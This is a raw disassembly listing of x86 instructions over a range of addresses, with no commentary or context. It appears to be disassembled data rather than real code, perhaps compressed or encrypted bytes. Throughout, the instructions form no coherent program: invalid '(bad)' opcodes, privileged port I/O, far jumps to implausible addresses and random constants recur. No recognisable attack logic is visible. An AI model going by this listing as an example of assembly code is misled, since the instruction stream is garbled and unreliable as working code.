  41bde8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bde9:	push   cs
  41bdea:	xchg   bh,ah
  41bdec:	adc    cl,BYTE PTR [ebx-0x5b]
  41bdef:	push   cs
  41bdf0:	sub    al,0x59
  41bdf2:	aaa    
  41bdf3:	(bad)  
  41bdf4:	leave  
  41bdf5:	sub    ebx,DWORD PTR [ecx]
  41bdf7:	out    0xa2,eax
  41bdf9:	mov    bh,0x95
  41bdfb:	aad    0x15
  41bdfd:	cs xchg esi,eax
  41bdff:	in     eax,dx
  41be00:	(bad)  
  41be01:	xor    ebp,esp
  41be03:	add    eax,0x4c51b917
  41be08:	pop    edx
  41be09:	xchg   ebp,eax
  41be0a:	fild   WORD PTR [esi-0x67]
  41be0d:	push   0xd
  41be0f:	lock pop ebx
  41be11:	xchg   DWORD PTR [esi+esi*4-0x1d],esi
  41be15:	sahf   
  41be16:	imul   DWORD PTR [esi]
  41be18:	test   al,0x3b
  41be1a:	dec    ebx
  41be1b:	sbb    al,0x2d
  41be1d:	sbb    esp,ebp
  41be1f:	inc    esp
  41be20:	leave  
  41be21:	jge    0x41be2e
  41be23:	fadd   QWORD PTR [di]
  41be26:	retf   
  41be27:	and    ebp,eax
  41be29:	popa   
  41be2a:	xor    esi,eax
  41be2c:	scas   al,BYTE PTR es:[edi]
  41be2d:	loope  0x41bea6
  41be2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be30:	and    ecx,DWORD PTR [ecx-0x4655eb18]
  41be36:	push   0x2a
  41be38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be39:	fwait
  41be3a:	stos   DWORD PTR es:[edi],eax
  41be3b:	stc    
  41be3c:	xor    eax,0x9b9c6622
  41be41:	pop    esi
  41be42:	mov    edx,0xc36126df
  41be47:	les    eax,FWORD PTR [esi+0x4cb8fd6f]
  41be4d:	cdq    
  41be4e:	jnp    0x41bec4
  41be50:	sub    cl,BYTE PTR [ecx-0x370929ce]
  41be56:	add    esp,DWORD PTR [eax+0x24]
  41be59:	cmp    eax,0x281b05a0
  41be5e:	out    0xe9,eax
  41be60:	lea    edx,[ebx-0x62a6f0a4]
  41be66:	lods   al,BYTE PTR ds:[esi]
  41be67:	dec    edx
  41be68:	cld    
  41be69:	sub    esi,DWORD PTR [ebx-0x4cd84506]
  41be6f:	or     ah,dh
  41be71:	xor    DWORD PTR [esi+0x11371bb4],esi
  41be77:	xlat   BYTE PTR ds:[ebx]
  41be78:	test   edx,ebx
  41be7a:	int    0xe8
  41be7c:	and    al,dl
  41be7e:	jno    0x41bee1
  41be80:	jns    0x41be0b
  41be82:	jge    0x41bebf
  41be84:	dec    edx
  41be85:	fiadd  WORD PTR ds:0x7b356567
  41be8b:	hlt    
  41be8c:	adc    BYTE PTR [edi-0x4c],dl
  41be8f:	mov    ebx,0x8261795f
  41be94:	jl     0x41be64
  41be96:	mov    eax,0xb0ae3f8e
  41be9b:	pusha  
  41be9c:	adc    eax,0xc0e6c30b
  41bea1:	fdivr  DWORD PTR [edx-0x1b]
  41bea4:	and    BYTE PTR [ecx+0x547b8e3a],bh
  41beaa:	neg    esi
  41beac:	ficomp WORD PTR [edx+ecx*8]
  41beaf:	push   0xff20df45
  41beb4:	sub    BYTE PTR [edx-0x33],ah
  41beb7:	jl     0x41bf01
  41beb9:	mov    edi,0x29acea1f
  41bebe:	jg     0x41be93
  41bec0:	and    eax,edx
  41bec2:	sub    eax,eax
  41bec4:	xor    DWORD PTR [ebx-0x5fb54b77],esp
  41beca:	sbb    edi,DWORD PTR [eax]
  41becc:	stos   BYTE PTR es:[edi],al
  41becd:	ss dec esp
  41becf:	push   eax
  41bed0:	ret    0xf7d
  41bed3:	lods   al,BYTE PTR ds:[esi]
  41bed4:	xchg   BYTE PTR [ecx-0x6142fb4e],dl
  41beda:	cmp    al,BYTE PTR [ebx]
  41bedc:	mov    ch,0xb0
  41bede:	fs repz pop ebp
  41bee1:	mov    edx,0xb91d33d6
  41bee6:	in     eax,dx
  41bee7:	in     eax,0xe1
  41bee9:	pop    ds
  41beea:	mov    ah,0x95
  41beec:	jmp    0xe97cf8ac
  41bef1:	dec    eax
  41bef2:	mov    eax,ds:0xbb1590bb
  41bef7:	cld    
  41bef8:	addr16 mov ecx,0x2a4b54af
  41befe:	cs xor eax,0xbed33351
  41bf04:	fs mov dh,0x2
  41bf08:	mov    cl,BYTE PTR [edx-0x41]
  41bf0b:	inc    edi
  41bf0c:	and    DWORD PTR [ecx+0x73dbad36],esi
  41bf12:	inc    ecx
  41bf13:	xor    al,0x16
  41bf15:	imul   edi,edx,0x96d37fa4
  41bf1b:	sbb    edx,edi
  41bf1d:	xchg   ah,bl
  41bf1f:	sahf   
  41bf20:	leave  
  41bf21:	push   es
  41bf22:	adc    al,0xfb
  41bf24:	pop    ebp
  41bf25:	or     DWORD PTR [esi+edx*1-0x225ae654],edi
  41bf2c:	dec    ebp
  41bf2d:	pushf  
  41bf2e:	jae    0x41bf19
  41bf30:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41bf32:	dec    ebp
  41bf33:	add    ebp,DWORD PTR [eax-0x92e31f2]
  41bf39:	jmp    0x41bfac
  41bf3b:	int    0x92
  41bf3d:	push   edx
  41bf3e:	out    dx,al
  41bf3f:	or     dl,al
  41bf41:	mov    bl,0xb3
  41bf43:	inc    ecx
  41bf44:	ret    
  41bf45:	sbb    edi,DWORD PTR [ecx-0x48fcba4c]
  41bf4b:	shl    bh,1
  41bf4d:	or     ebx,eax
  41bf4f:	mov    ebx,0xddafa587
  41bf54:	call   0xd210ac7c
  41bf59:	cld    
  41bf5a:	loop   0x41bfb6
  41bf5c:	fstp   DWORD PTR [esi-0x7f78967d]
  41bf62:	or     edx,eax
  41bf64:	aad    0x16
  41bf66:	sbb    al,0x2a
  41bf68:	popa   
  41bf69:	test   eax,0xa6b2cb7c
  41bf6e:	aaa    
  41bf6f:	inc    ebx
  41bf70:	ror    esi,0xc
  41bf73:	sbb    al,0x1e
  41bf75:	sub    DWORD PTR [edi+0x23],esi
  41bf78:	bound  esp,QWORD PTR [edi-0x80]
  41bf7b:	mov    ah,0x3e
  41bf7d:	sahf   
  41bf7e:	jmp    0x41bf8b
  41bf80:	test   DWORD PTR [ebx-0x47],ebp
  41bf83:	dec    esp
  41bf84:	out    0xb0,eax
  41bf86:	sbb    bl,0xdd
  41bf89:	call   0xc2f3:0xd246352e
  41bf90:	cwde   
  41bf91:	retf   0x41e5
  41bf94:	stos   DWORD PTR es:[edi],eax
  41bf95:	cdq    
  41bf96:	xchg   esp,eax
  41bf97:	sub    al,0x5e
  41bf99:	adc    DWORD PTR [ebx-0x3a],0x75a1a399
  41bfa0:	stc    
  41bfa1:	nop
  41bfa2:	or     ecx,DWORD PTR [edi]
  41bfa4:	push   ebp
  41bfa5:	and    bl,BYTE PTR ds:0xfdab89f1
  41bfab:	push   ds
  41bfac:	xchg   edi,eax
  41bfad:	cwde   
  41bfae:	or     eax,0x9b4ddb35
  41bfb3:	aam    0xc5
  41bfb5:	mov    ebp,0xc783e9f0
  41bfba:	push   ebp
  41bfbb:	es in  eax,0x13
  41bfbe:	ds in  eax,dx
  41bfc0:	or     al,0xd5
  41bfc2:	inc    edi
  41bfc3:	ins    BYTE PTR es:[edi],dx
  41bfc4:	pop    ss
  41bfc5:	cdq    
  41bfc6:	mov    DWORD PTR ds:0x202f0f57,ebp
  41bfcc:	sbb    al,0xa0
  41bfce:	mov    ebx,DWORD PTR [ecx+0x53]
  41bfd1:	pop    ds
  41bfd2:	mov    eax,eax
  41bfd4:	or     BYTE PTR [ebp+0x2b5f8978],bl
  41bfda:	ret    
  41bfdb:	test   ah,cl
  41bfdd:	push   ebp
  41bfde:	into   
  41bfdf:	xor    DWORD PTR [ebx-0x5a],ebx
  41bfe2:	mov    ebx,0xbea3d500
  41bfe7:	pop    ds
  41bfe8:	(bad)  
  41bfe9:	sub    al,0x9b
  41bfeb:	and    cl,BYTE PTR [edi-0x17]
  41bfee:	pop    esi
  41bfef:	ins    BYTE PTR es:[edi],dx
  41bff0:	jbe    0x41bfe2
  41bff2:	push   eax
  41bff3:	cdq    
  41bff4:	xor    al,0x34
  41bff6:	xchg   edi,eax
  41bff7:	out    0xf5,al
  41bff9:	push   ebp
  41bffa:	outs   dx,DWORD PTR ds:[esi]
  41bffb:	in     al,dx
  41bffc:	inc    esp
  41bffd:	push   edx
  41bffe:	(bad)
  41c001:	mov    ecx,0xece1c506
  41c006:	shl    DWORD PTR [ebp+0x2b],cl
  41c009:	aas    
  41c00a:	dec    ebx
  41c00b:	sbb    al,BYTE PTR [esi]
  41c00d:	push   ebx
  41c00e:	sbb    al,0x9
  41c010:	push   es
  41c011:	data16 sahf 
  41c013:	inc    edi
  41c014:	mov    esp,0x21a2b31d
  41c019:	daa    
  41c01a:	outs   dx,DWORD PTR ds:[esi]
  41c01b:	clc    
  41c01c:	mov    DWORD PTR [ecx+0x7b08ab43],ebx
  41c022:	sub    al,0x3d
  41c024:	mov    al,0x9b
  41c026:	sbb    edx,edi
  41c028:	mov    ebp,0xdf773e45
  41c02d:	or     dl,BYTE PTR [ebx]
  41c02f:	or     ch,BYTE PTR [esi-0x3e05c45f]
  41c035:	add    esp,ebx
  41c037:	add    esi,DWORD PTR [ecx-0x3e]
  41c03a:	cmp    al,BYTE PTR [edx-0x47]
  41c03d:	nop
  41c03e:	adc    BYTE PTR [eax+0xc],dh
  41c041:	cwde   
  41c042:	mov    ch,0x5c
  41c044:	in     al,0xf
  41c046:	sar    DWORD PTR [esi],1
  41c048:	and    esp,DWORD PTR [esi]
  41c04a:	mov    ch,0x54
  41c04c:	xchg   BYTE PTR [edx],ch
  41c04e:	xchg   dh,bl
  41c050:	test   edi,esi
  41c052:	cmp    esi,ebx
  41c054:	add    ebx,DWORD PTR [ebp-0x6e83794]
  41c05a:	shl    DWORD PTR [ecx-0x55e24023],cl
  41c060:	retf   
  41c061:	(bad)  
  41c063:	scas   al,BYTE PTR es:[edi]
  41c064:	push   cs
  41c065:	imul   esp,DWORD PTR [esi-0x3be9086c],0xfffffff3
  41c06c:	pop    ss
  41c06d:	dec    ecx
  41c06e:	sbb    eax,0x1a2c8bf6
  41c073:	push   ds
  41c074:	sbb    ecx,esp
  41c076:	sbb    edx,DWORD PTR [eax]
  41c078:	sub    al,0x2f
  41c07a:	push   ss
  41c07b:	jns    0x41c017
  41c07d:	jae    0x41c062
  41c07f:	or     esp,DWORD PTR [edx]
  41c081:	imul   ecx,DWORD PTR [esi+0x4cac6692],0x51608034
  41c08b:	push   ss
  41c08c:	call   0xbebe:0xe14253e
  41c093:	in     al,0x6
  41c095:	add    eax,edx
  41c097:	call   0xb4fd1c1b
  41c09c:	popf   
  41c09d:	imul   esp,DWORD PTR [edx+0xde1b5a5],0xfa26baef
  41c0a7:	loopne 0x41c0fc
  41c0a9:	imul   edi,DWORD PTR [ecx],0xe5a6433e
  41c0af:	jno    0x41c0d1
  41c0b1:	(bad)
  41c0b5:	sbb    DWORD PTR [eax-0x47],ebp
  41c0b8:	in     eax,dx
  41c0b9:	inc    ebp
  41c0ba:	jge    0x41c0a8
  41c0bc:	aaa    
  41c0bd:	rcr    ebp,1
  41c0bf:	lds    esp,FWORD PTR [eax]
  41c0c1:	cdq    
  41c0c2:	sbb    DWORD PTR [edi+esi*2-0x14e3fcd1],edi
  41c0c9:	jge    0x41c0a7
  41c0cb:	arpl   WORD PTR ds:0xb0dc458f,bx
  41c0d2:	mov    bl,0x68
  41c0d4:	and    DWORD PTR [ecx],ecx
  41c0d6:	ins    BYTE PTR es:[edi],dx
  41c0d7:	ins    DWORD PTR es:[edi],dx
  41c0d8:	jmp    0x41c128
  41c0da:	mov    dl,0x5a
  41c0dc:	mov    BYTE PTR [edx-0x23662645],ah
  41c0e2:	pushf  
  41c0e3:	ja     0x41c121
  41c0e5:	jo     0x41c0c3
  41c0e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0e9:	idiv   BYTE PTR [eax+0x557976a4]
  41c0ef:	jne    0x41c086
  41c0f1:	mov    edi,edx
  41c0f3:	jmp    0xa015:0xa12fd545
  41c0fa:	lods   eax,DWORD PTR ds:[esi]
  41c0fb:	std    
  41c0fc:	jg     0x41c09b
  41c0fe:	arpl   WORD PTR [eax+0x20],di
  41c101:	push   ebp
  41c102:	in     al,0xb0
  41c104:	xor    BYTE PTR [eax+0x6e094edb],ch
  41c10a:	les    ecx,FWORD PTR [edx-0x48]
  41c10d:	and    edi,DWORD PTR [eax]
  41c10f:	push   ebx
  41c110:	and    DWORD PTR [ecx+0x23a29c24],edi
  41c116:	test   eax,0xcbcf6252
  41c11b:	aaa    
  41c11c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c11d:	test   eax,0x2796fb67
  41c122:	fs mov esi,0x8578492b
  41c128:	ror    DWORD PTR [edx],1
  41c12a:	out    dx,eax
  41c12b:	test   eax,0xfa00ab17
  41c130:	inc    ebp
  41c131:	stc    
  41c132:	dec    ebp
  41c133:	hlt    
  41c134:	adc    ah,BYTE PTR [ecx+ebx*2]
  41c137:	gs or  edx,edi
  41c13a:	mul    DWORD PTR [edx-0x7a8263cb]
  41c140:	or     al,0xd3
  41c142:	icebp  
  41c143:	shl    BYTE PTR [ebp+0x56],1
  41c146:	stos   DWORD PTR es:[edi],eax
  41c147:	in     al,dx
  41c148:	jo     0x41c1aa
  41c14a:	mov    ds:0xc91ca5a6,eax
  41c14f:	jle    0x41c16e
  41c151:	fstp   DWORD PTR [ecx+0x1b7949da]
  41c157:	and    eax,0xabfbe412
  41c15c:	in     eax,dx
  41c15d:	ret    
  41c15e:	addr16 or al,0xa1
  41c161:	push   ebp
  41c162:	leave  
  41c163:	inc    DWORD PTR [ebp+0x7d]
  41c166:	in     eax,0x2f
  41c168:	and    cl,BYTE PTR [ecx+0x1b1233d5]
  41c16e:	dec    ebx
  41c16f:	dec    ebp
  41c170:	cmp    edx,DWORD PTR [ebx-0x5af6ce13]
  41c176:	stos   DWORD PTR es:[edi],eax
  41c177:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c178:	inc    eax
  41c179:	jns    0x41c1c9
  41c17b:	dec    ebx
  41c17c:	and    BYTE PTR [ecx-0x5c],cl
  41c17f:	ds cmp al,0xb5
  41c182:	lods   al,BYTE PTR ds:[esi]
  41c183:	sub    al,ch
  41c185:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c186:	sub    edx,DWORD PTR [ebx]
  41c188:	pushf  
  41c189:	inc    ebp
  41c18a:	and    DWORD PTR [ebx+ebp*2],0xffffff96
  41c18e:	mov    ds:0x7b9fa5c6,al
  41c193:	retf   0xa7a3
  41c196:	inc    ebp
  41c197:	les    ebp,FWORD PTR [ebx]
  41c199:	popf   
  41c19a:	jnp    0x41c174
  41c19c:	ds or  bh,ah
  41c19f:	ss gs xchg esp,eax
  41c1a2:	dec    ebx
  41c1a3:	ds mov esi,ebp
  41c1a6:	mov    ecx,0xc8d04264
  41c1ab:	fisub  DWORD PTR [ebp-0x3]
  41c1ae:	xor    al,dh
  41c1b0:	test   eax,0xf7256828
  41c1b5:	cdq    
  41c1b6:	xchg   ebx,eax
  41c1b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1b8:	mov    edi,0x65ce54fa
  41c1bd:	inc    ecx
  41c1be:	mov    ah,0x34
  41c1c0:	iret   
  41c1c1:	mov    eax,ds:0x44cf73cb
  41c1c6:	jl     0x41c245
  41c1c8:	jbe    0x41c1e8
  41c1ca:	(bad)  
  41c1cb:	out    0xd0,al
  41c1cd:	inc    edi
  41c1ce:	scas   al,BYTE PTR es:[edi]
  41c1cf:	aad    0xe5
  41c1d1:	jecxz  0x41c160
  41c1d3:	lock out dx,al
  41c1d5:	popf   
  41c1d6:	mov    eax,ecx
  41c1d8:	sbb    cl,dl
  41c1da:	sbb    eax,0xa8358ed9
  41c1df:	retf   
  41c1e0:	dec    ecx
  41c1e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1e2:	xor    ecx,eax
  41c1e4:	or     cl,bh
  41c1e6:	pop    ss
  41c1e7:	clc    
  41c1e8:	shl    DWORD PTR [edx-0x1b6683f5],0x88
  41c1ef:	pop    edi
  41c1f0:	js     0x41c1a7
  41c1f2:	pop    eax
  41c1f3:	and    BYTE PTR [eax+0x15],al
  41c1f6:	jmp    0x41c25c
  41c1f8:	or     dl,dl
  41c1fa:	stos   BYTE PTR es:[edi],al
  41c1fb:	(bad)  
  41c1fc:	fidiv  WORD PTR [edi]
  41c1fe:	fldenv [ebp+0x65]
  41c201:	mov    eax,ds:0xeeeaf12c
  41c206:	in     eax,dx
  41c207:	rcl    DWORD PTR [eax],1
  41c209:	cmp    edx,DWORD PTR [edx-0x7f]
  41c20c:	dec    esi
  41c20d:	adc    eax,0x9f85c62b
  41c212:	cwde   
  41c213:	(bad)  
  41c214:	in     al,dx
  41c215:	pushf  
  41c216:	sbb    eax,DWORD PTR [esp+eiz*8-0x66052fef]
  41c21d:	and    eax,0x625d2fb4
  41c222:	mov    cl,0xb4
  41c224:	and    al,0xe
  41c226:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c227:	dec    ebp
  41c228:	add    eax,0xaf03b6f
  41c22d:	in     eax,dx
  41c22e:	dec    ebp
  41c22f:	jge    0x41c24a
  41c231:	mov    DWORD PTR [edi+0x2b03c67a],esi
  41c237:	xor    al,0x2d
  41c239:	cmp    ax,0x4b7
  41c23d:	mov    eax,ds:0x1ba626bb
  41c242:	mov    eax,0x9607417e
  41c247:	(bad)  
  41c248:	stos   DWORD PTR es:[edi],eax
  41c249:	lods   eax,DWORD PTR ds:[esi]
  41c24a:	mov    cl,0x94
  41c24c:	cmp    al,0x5b
  41c24e:	inc    ebp
  41c24f:	test   BYTE PTR [edi-0x1a],0x9d
  41c253:	mov    edx,0xece97701
  41c258:	push   es
  41c259:	ja     0x41c1e2
  41c25b:	add    eax,0xcc509922
  41c260:	and    eax,0x7e59cc60
  41c265:	xchg   DWORD PTR [ebp+0x17],edi
  41c268:	add    ebx,esi
  41c26a:	enter  0xfe11,0x5b
  41c26e:	add    DWORD PTR [ecx-0x5b],0x3b
  41c272:	adc    al,0xf1
  41c274:	shr    esp,0x4b
  41c277:	xor    DWORD PTR [edx+0x43],0xffffffbe
  41c27b:	fs ins BYTE PTR es:[edi],dx
  41c27d:	mov    dl,0xef
  41c27f:	std    
  41c280:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c281:	outs   dx,BYTE PTR ds:[esi]
  41c282:	test   al,0xeb
  41c284:	adc    eax,0x21a5c214
  41c289:	sub    edx,ebp
  41c28b:	and    ebx,ecx
  41c28d:	mov    edx,0xa25cd24a
  41c292:	retf   
  41c293:	jb     0x41c2bb
  41c295:	push   ebx
  41c296:	adc    dl,BYTE PTR [ebx-0x6c718461]
  41c29c:	dec    eax
  41c29d:	ins    BYTE PTR es:[edi],dx
  41c29e:	mov    dl,0xe4
  41c2a0:	push   edi
  41c2a1:	sbb    DWORD PTR [esi],esi
  41c2a3:	inc    eax
  41c2a4:	inc    ebp
  41c2a5:	sub    ebp,esp
  41c2a7:	repnz idiv DWORD PTR [esi+0x491ca81c]
  41c2ae:	test   dh,dh
  41c2b0:	xchg   ecx,eax
  41c2b1:	stos   DWORD PTR es:[edi],eax
  41c2b2:	data16 sub ah,ah
  41c2b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2b6:	jnp    0x41c2ed
  41c2b8:	imul   edi,DWORD PTR [edx+0x5366de6],0x3b
  41c2bf:	cmp    ebp,DWORD PTR [ebx]
  41c2c1:	push   ds
  41c2c2:	mov    esp,0xbe066c54
  41c2c7:	pop    ds
  41c2c8:	lds    ecx,FWORD PTR ds:0xfcb9133c
  41c2ce:	lock or DWORD PTR [ebx],0x962793a1
  41c2d5:	retf   
  41c2d6:	fnsave [esi]
  41c2d8:	enter  0xb2e4,0x44
  41c2dc:	xor    ah,ah
  41c2de:	push   cs
  41c2df:	or     BYTE PTR [ebp-0x2f63460],0x15
  41c2e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2e7:	inc    esi
  41c2e8:	mov    bh,0x44
  41c2ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2eb:	lahf   
  41c2ec:	in     eax,0x46
  41c2ee:	cs inc ebp
  41c2f0:	pop    ss
  41c2f1:	std    
  41c2f2:	cmp    BYTE PTR [esi+0x83c8465],cl
  41c2f8:	idiv   BYTE PTR [esi+0x25]
  41c2fb:	xor    eax,0xbebe8c3b
  41c300:	cs jns 0x41c2be
  41c303:	loop   0x41c300
  41c305:	fadd   st(3),st
  41c307:	mov    dl,0x16
  41c309:	dec    eax
  41c30a:	push   ebp
  41c30b:	mov    al,0xc1
  41c30d:	xchg   ebp,eax
  41c30e:	dec    ebp
  41c30f:	jno    0x41c2f8
  41c311:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c312:	mov    ds:0xa0d6bd84,eax
  41c317:	mov    WORD PTR [edx],ds
  41c319:	jns    0x41c360
  41c31b:	lods   al,BYTE PTR ds:[esi]
  41c31c:	jae    0x41c303
  41c31e:	call   FWORD PTR [ebx-0x77945f26]
  41c324:	inc    ecx
  41c325:	ret    0x82ef
  41c328:	lods   al,BYTE PTR ds:[esi]
  41c329:	lahf   
  41c32a:	popf   
  41c32b:	icebp  
  41c32c:	and    BYTE PTR [edx],dl
  41c32e:	mov    bl,0xa4
  41c330:	scas   eax,DWORD PTR es:[edi]
  41c331:	and    bh,BYTE PTR [esi]
  41c333:	ds ja  0x41c2e8
  41c336:	imul   ebx,edi,0xf4101501
  41c33c:	shr    bh,cl
  41c33e:	jbe    0x41c2e7
  41c340:	sub    ch,BYTE PTR [edi+0x8a42627]
  41c346:	mov    ah,0xe4
  41c348:	repnz and al,0xd7
  41c34b:	pop    esp
  41c34c:	xchg   di,ax
  41c34e:	mov    ds:0xf3a52343,eax
  41c353:	lahf   
  41c354:	push   ebx
  41c355:	add    ah,BYTE PTR [ebp-0x49fa493b]
  41c35b:	in     al,0x4b
  41c35d:	stc    
  41c35e:	lods   al,BYTE PTR ds:[esi]
  41c35f:	xor    eax,0xf31188e5
  41c364:	sub    BYTE PTR [esi-0x7f],bl
  41c367:	jb     0x41c386
  41c369:	neg    DWORD PTR [esi]
  41c36b:	inc    ecx
  41c36c:	inc    ebx
  41c36d:	out    dx,eax
  41c36e:	mov    ebp,0xeafa4934
  41c373:	add    DWORD PTR [ebp+0x22f0dd06],0x23
  41c37a:	jo     0x41c339
  41c37c:	adc    BYTE PTR [edx],bh
  41c37e:	les    ebx,FWORD PTR [edx+edx*1-0x17beb262]
  41c385:	int3   
  41c386:	jg     0x41c35b
  41c388:	gs fst st(7)
  41c38b:	icebp  
  41c38c:	pop    ebx
  41c38d:	call   0x491b:0x291630bc
  41c394:	xor    al,0x6b
  41c396:	sbb    BYTE PTR [edi],ah
  41c398:	dec    esp
  41c399:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c39a:	imul   ebp,DWORD PTR [edi-0x43],0x1b
  41c39e:	ficomp DWORD PTR [ebp-0x4941f29f]
  41c3a4:	in     eax,dx
  41c3a5:	jl     0x41c41d
  41c3a7:	push   ss
  41c3a8:	imul   esp,edx,0x20874be
  41c3ae:	lea    esi,[edx+edi*2+0x37]
  41c3b2:	sub    al,0xbf
  41c3b4:	sbb    al,BYTE PTR [ecx-0x12a5ae25]
  41c3ba:	dec    esi
  41c3bb:	ins    WORD PTR es:[edi],dx
  41c3bd:	xor    BYTE PTR [ebx+0x2c3cd8f4],0xfc
  41c3c4:	test   DWORD PTR ds:0x2ce5e792,eax
  41c3ca:	and    dh,bh
  41c3cc:	js     0x41c409
  41c3ce:	lds    edx,FWORD PTR ds:0xc7168b5b
  41c3d4:	sbb    eax,0x3134b5c4
  41c3d9:	test   al,0x6b
  41c3db:	rcl    DWORD PTR [ebx+0x36],cl
  41c3de:	pop    esi
  41c3df:	clc    
  41c3e0:	sti    
  41c3e1:	pusha  
  41c3e2:	jmp    0x41c394
  41c3e4:	sub    DWORD PTR [edi],0x936b74b1
  41c3ea:	(bad)  
  41c3eb:	adc    al,0x65
  41c3ed:	stos   BYTE PTR es:[edi],al
  41c3ee:	(bad)  
  41c3ef:	call   0x55f09996
  41c3f4:	and    BYTE PTR [ecx],ch
  41c3f6:	das    
  41c3f7:	scas   eax,DWORD PTR es:[edi]
  41c3f8:	add    ebx,0xffffffd3
  41c3fb:	jge    0x41c43f
  41c3fd:	shr    DWORD PTR [ebx-0x1ac2c73c],cl
  41c403:	stos   BYTE PTR es:[edi],al
  41c404:	pop    ss
  41c405:	inc    ebx
  41c406:	in     eax,dx
  41c407:	js     0x41c42b
  41c409:	sbb    DWORD PTR [esi+ebx*4],edi
  41c40c:	pop    ebp
  41c40d:	fwait
  41c40e:	adc    DWORD PTR [edi],ecx
  41c410:	push   ds
  41c411:	ret    
  41c412:	jnp    0x41c407
  41c414:	popf   
  41c415:	xchg   ecx,eax
  41c416:	imul   ecx,eax,0x2397a8e8
  41c41c:	mov    ebx,0x5894bc84
  41c421:	xchg   edx,eax
  41c422:	sbb    eax,0xbbd948ab
  41c427:	push   es
  41c428:	sub    DWORD PTR [ecx+0x3b],edi
  41c42b:	xchg   ebx,eax
  41c42c:	cli    
  41c42d:	loope  0x41c3d8
  41c42f:	push   0x213dd524
  41c434:	cmc    
  41c435:	mov    eax,DWORD PTR [ebx-0xd]
  41c438:	mov    bl,0x4f
  41c43a:	js     0x41c405
  41c43c:	and    al,0xb9
  41c43e:	jmp    0x41c49d
  41c440:	sti    
  41c441:	mov    eax,0xd07bdc9d
  41c446:	and    dl,BYTE PTR ds:0xebec8ef5
  41c44c:	pop    ebx
  41c44d:	shl    ebp,1
  41c44f:	gs sbb ecx,edi
  41c452:	adc    BYTE PTR [ebp-0x67],bh
  41c455:	cmp    DWORD PTR [ebx],0xffffffb2
  41c458:	or     BYTE PTR [ebx+0xf],ah
  41c45b:	jae    0x41c448
  41c45d:	pushf  
  41c45e:	je     0x41c434
  41c460:	fld    QWORD PTR [ecx-0x41]
  41c463:	sub    al,0x94
  41c465:	data16 jge 0x41c3fb
  41c468:	dec    esp
  41c469:	mov    eax,es
  41c46b:	and    al,0x44
  41c46d:	mov    dl,0x83
  41c46f:	(bad)  
  41c470:	pusha  
  41c471:	or     esp,ecx
  41c473:	jae    0x41c4a9
  41c475:	ins    BYTE PTR es:[edi],dx
  41c476:	iret   
  41c477:	(bad)  
  41c478:	pop    ds
  41c479:	pop    ecx
  41c47a:	xor    eax,0xa8926c26
  41c47f:	pop    es
  41c480:	xchg   ecx,eax
  41c481:	fnstenv [ebx]
  41c483:	syscall 
  41c485:	aad    0x98
  41c487:	dec    esi
  41c488:	into   
  41c489:	in     eax,0xc4
  41c48b:	rol    BYTE PTR [esi-0x2f4e4463],1
  41c491:	mov    esp,0x31eafcc3
  41c496:	dec    si
  41c498:	jg     0x41c4ad
  41c49a:	mov    ch,0xe4
  41c49c:	xor    DWORD PTR [esi+0x56],esi
  41c49f:	mov    cl,0x2d
  41c4a1:	retf   0x46cb
  41c4a4:	push   0x9e79f1cc
  41c4a9:	ror    DWORD PTR [esi],1
  41c4ab:	jmp    0xdc8d8dd3
  41c4b0:	fidiv  WORD PTR [ebx]
  41c4b2:	xor    eax,0xdb9d561d
  41c4b7:	lea    esp,[eax-0x40]
  41c4ba:	jns    0x41c4f6
  41c4bc:	or     BYTE PTR [ecx],bh
  41c4be:	mov    esp,0xb528b742
  41c4c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4c4:	ss retf 0xcfc2
  41c4c8:	jne    0x41c4e1
  41c4ca:	dec    edi
  41c4cb:	call   0xdd71f504
  41c4d0:	or     DWORD PTR [edx-0x5cfc75c3],ecx
  41c4d6:	icebp  
  41c4d7:	lock or ebp,ebp
  41c4da:	test   BYTE PTR ds:0xe5d6dea5,bl
  41c4e0:	adc    al,0x94
  41c4e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4e3:	call   0x391e:0x46291c02
  41c4ea:	or     BYTE PTR [ebp-0x1198851c],dl
  41c4f0:	jg     0x41c567
  41c4f2:	cmp    ch,dh
  41c4f4:	jne    0x41c488
  41c4f6:	loopne 0x41c4de
  41c4f8:	add    DWORD PTR [edx+eiz*4],edi
  41c4fb:	fisub  DWORD PTR [edx]
  41c4fd:	je     0x41c574
  41c4ff:	stos   BYTE PTR es:[edi],al
  41c500:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c501:	test   al,0x5b
  41c503:	pop    eax
  41c504:	ins    BYTE PTR es:[edi],dx
  41c505:	ret    
  41c506:	fwait
  41c507:	pop    edx
  41c508:	aaa    
  41c509:	popf   
  41c50a:	cmp    edx,DWORD PTR [edx+edi*8-0x7e]
  41c50e:	sub    bh,bl
  41c510:	and    al,0x9b
  41c512:	and    dh,BYTE PTR [edx]
  41c514:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c515:	dec    esp
  41c516:	mov    bl,0x3
  41c518:	int    0x24
  41c51a:	mov    esi,ebx
  41c51c:	ja     0x41c504
  41c51e:	mov    ebx,DWORD PTR [eax-0x16997c3b]
  41c524:	cmp    ecx,DWORD PTR [ebx]
  41c526:	or     al,BYTE PTR [esp+ebx*1]
  41c529:	sbb    DWORD PTR [edx],esp
  41c52b:	mov    ah,0xe3
